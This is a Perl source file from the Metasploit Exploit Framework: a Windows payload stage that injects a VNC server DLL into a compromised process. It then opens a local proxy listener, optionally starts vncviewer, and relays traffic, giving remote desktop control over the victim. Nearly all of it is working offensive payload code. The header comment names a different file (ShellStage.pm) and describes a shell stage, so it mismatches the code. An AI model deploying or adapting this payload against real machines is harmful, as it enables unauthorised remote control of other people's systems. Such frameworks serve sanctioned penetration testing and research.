###############
##
#
#    Name: ShellStage.pm
# Version: $Revision$
# License:
#
#      This file is part of the Metasploit Exploit Framework
#      and is subject to the same licenses and copyrights as
#      the rest of this package.
#
# Descrip:
#
#      Calls RevertToSelf and then creates a command interpreter
#      with input/output redirected to the file descriptor from the
#      first stage.
#
##
###############

package Msf::PayloadComponent::Windows::ia32::InjectVncStage;

use strict;
use base 'Msf::PayloadComponent::Windows::ia32::InjectLibStage';
use FindBin qw{$RealBin};

my $info =
{
	'Authors'       => 
		[
			'Matt Miller <mmiller [at] hick.org>',
			'Jarkko Turkulainen <jt [at] klake.org>',
		],
	'UserOpts'      => 
		{ 
			'VNCDLL'  => [1, 'PATH', 'The full path the VNC service dll', "$RealBin/data/vncdll.dll"],
			'VNCPORT' => [1, 'PORT', 'The local port to use for the VNC proxy',  5900],
			'AUTOVNC' => [1, 'BOOL', 'Automatically launch vncviewer', 1],
		},

};

sub new
{
	my $class = shift;
	my $hash = @_ ? shift : { };
	my $self;

	$hash = $class->MergeHashRec($hash, {'Info' => $info});
	$self = $class->SUPER::new($hash);

	return $self;
}

#
# Returns the path of the VNC DLL that is to be injected
#
sub _InjectDLL 
{
	my $self = shift;

	return $self->GetVar('VNCDLL');
}

#
# Returns the pseudo-name of the DLL that is being injected
#
sub _InjectDLLName
{
	my $self = shift;

	return "hax0r.dll"; # randomize me!
}

#
# Transfers the VNC DLL and begins the proxy connection
#
sub HandleConnection 
{
  my $self = shift;
  my $sock = $self->PipeRemoteOut;
  $self->SUPER::HandleConnection;
  sleep(1);

  # Create listener socket
  my $lis = IO::Socket::INET->new(
    'Proto'     => 'tcp',
    'ReuseAddr' => 1,
    'Listen'    => 5,
    'Blocking'  => 0,
    'LocalPort' => $self->GetVar('VNCPORT'),
  );  
  
  if (! $lis) {
    $self->PrintLine("[*] Problem creating the VNC proxy listener: $@");
    $self->KillChild;    
    return;  
  }
  
  $self->PrintLine('[*] VNC proxy listening on port '.$lis->sockport.'...');
  
  if ($self->GetVar('AUTOVNC')) {
    my $pid = fork();
    if (! $pid) {
        system("vncviewer 127.0.0.1::".$self->GetVar('VNCPORT'));
        exit(0);
    }
  }
  
  
  # Accept connection from user
  my $sel = IO::Select->new($lis);
  my $clock = time();
  my $mwait = 300;
  my $csock;
  
  while (! $csock && time < ($clock+$mwait))
  {
    foreach ($sel->can_read(0.25)) { $csock = $lis->accept() }
  }
  
  if (! $csock) {
    $self->PrintLine('[*] VNC proxy did not recieve connection before timeout');
    $self->KillChild;    
    return;
  } 
  
  $self->VNCProxy($sock, $csock);
  $self->PrintLine('[*] VNC proxy finished');
  
  $sock->close;
  $csock->close;
  $self->KillChild;
  return;
}

sub VNCProxy {
  my $self = shift;
  my $srv = shift;
  my $cli = shift;

  foreach ($srv, $cli) {
    $_->blocking(1);
    $_->autoflush(1);
  }

  my $selector = IO::Select->new($srv, $cli);

  LOOPER:
    while(1) {
      my @ready = $selector->can_read;
      foreach my $ready (@ready) {
        if($ready == $cli) {
          my $data;
          $cli->recv($data, 8192);
          last LOOPER if (! length($data));     
          last LOOPER if(!$srv || !$srv->connected);
          eval { $srv->send($data); };
          last LOOPER if $@;
        }
        elsif($ready == $srv) {
          my $data;
          $srv->recv($data, 8192);
          last LOOPER if(!length($data));
          last LOOPER if(!$cli || !$cli->connected);
          eval { $cli->send($data); };
          last LOOPER if $@;
        }
      }
    }
}

1;
